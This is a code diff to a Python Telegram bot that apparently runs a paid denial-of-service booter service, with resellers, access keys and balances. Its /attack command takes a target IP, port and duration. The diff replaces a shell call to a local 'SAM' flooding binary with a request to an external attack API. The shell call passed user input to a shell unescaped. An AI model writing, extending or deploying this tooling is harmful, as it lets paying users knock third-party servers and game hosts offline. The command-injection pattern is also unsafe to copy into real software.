@@ -1,7 +1,6 @@
 #!/usr/bin/python3
 
 import requests
-import subprocess
 import telebot
 import datetime
 import os
@@ -11,11 +10,6 @@ import threading
 from datetime import timedelta
 from threading import Timer
 import pytz
-import stat
-
-# Ensure SAM is executable
-if os.path.exists("SAM"):
-    os.chmod("SAM", stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  CONFIG
@@ -23,8 +17,11 @@ if os.path.exists("SAM"):
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 bot = telebot.TeleBot(BOT_TOKEN)
 
-API_KEY = "YOUR_EXTERNAL_API_KEY"
 ADMIN_IDS = {"7212246299"} # Ensure your ID is here
+
+# ⚠️ REPLACE THIS WITH YOUR ACTUAL API URL ⚠️
+# Use {ip}, {port}, and {time} as placeholders. The bot will automatically fill them in.
+ATTACK_API_URL = "http://YOUR_API_DOMAIN_OR_IP/api/attack?ip={ip}&port={port}&time={time}"
 
 USER_FILE        = "users.txt"
 LOG_FILE         = "log.txt"
@@ -32,7 +29,7 @@ USER_ACCESS_FILE = "users_access.txt"
 KEYS_FILE        = "keys.txt"
 RESELLERS_FILE   = "resellers.txt"
 BALANCE_FILE     = "balances.txt"
-ALL_USERS_FILE   = "all_users.txt" # Tracks everyone who clicks /start
+ALL_USERS_FILE   = "all_users.txt"
 
 ist = pytz.timezone('Asia/Kolkata')
 
@@ -673,13 +670,26 @@ def broadcast_reseller(message):
     execute_broadcast(message, list(RESELLER_IDS), "Broadcast to RESELLERS")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  ATTACK SYSTEM (Threaded)
+#  API ATTACK SYSTEM (Threaded)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-def run_attack_background(chat_id, target, port, time_val):
-    full_command = f"./SAM {target} {port} {time_val} 500"
-    subprocess.run(full_command, shell=True)
-    bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 🚀\n\nTarget: {target}\nPort: {port}\nDuration: {time_val}s")
+def run_attack_api(chat_id, target, port, time_val):
+    # Format the URL with the user's inputs
+    api_url = ATTACK_API_URL.format(ip=target, port=port, time=time_val)
+    
+    try:
+        # Send request to the API
+        response = requests.get(api_url, timeout=10)
+        
+        if response.status_code == 200:
+            # If the API accepts it, we wait for the duration of the attack
+            time.sleep(time_val)
+            bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 🚀\n\nTarget: {target}\nPort: {port}\nDuration: {time_val}s")
+        else:
+            bot.send_message(chat_id, f"⚠️ API Error: Server returned status {response.status_code}")
+            
+    except requests.exceptions.RequestException as e:
+        bot.send_message(chat_id, f"❌ Failed to reach the attack API. It might be offline.")
 
 @bot.message_handler(commands=['attack'])
 def handle_bgmi(message):
@@ -712,9 +722,10 @@ def handle_bgmi(message):
         log_action(user_id, f"Attack → IP: {target} | Port: {port} | Time: {time_val}s", message)
         
         username = message.from_user.username if message.from_user.username else message.from_user.first_name
-        bot.reply_to(message, f"{username}, 🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱 🚀\n\nTarget: {target}\nPort: {port}\nDuration: {time_val}s")
+        bot.reply_to(message, f"{username}, 🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱 via API 🚀\n\nTarget: {target}\nPort: {port}\nDuration: {time_val}s")
         
-        threading.Thread(target=run_attack_background, args=(message.chat.id, target, port, time_val)).start()
+        # Run API request in background so bot doesn't freeze
+        threading.Thread(target=run_attack_api, args=(message.chat.id, target, port, time_val)).start()
 
     else:
         bot.reply_to(message, "✅ Usage: /attack [ip] [port] [time]")
@@ -726,6 +737,6 @@ def handle_bgmi(message):
 if __name__ == "__main__":
     remove_expired_users()
     print("━━━━━━━━━━━━━━━━━━━━━━")
-    print("   ✅  Bot is running perfectly")
+    print("   ✅  Bot is running perfectly with API")
     print("━━━━━━━━━━━━━━━━━━━━━━")
     bot.infinity_polling(timeout=30, long_polling_timeout=20)
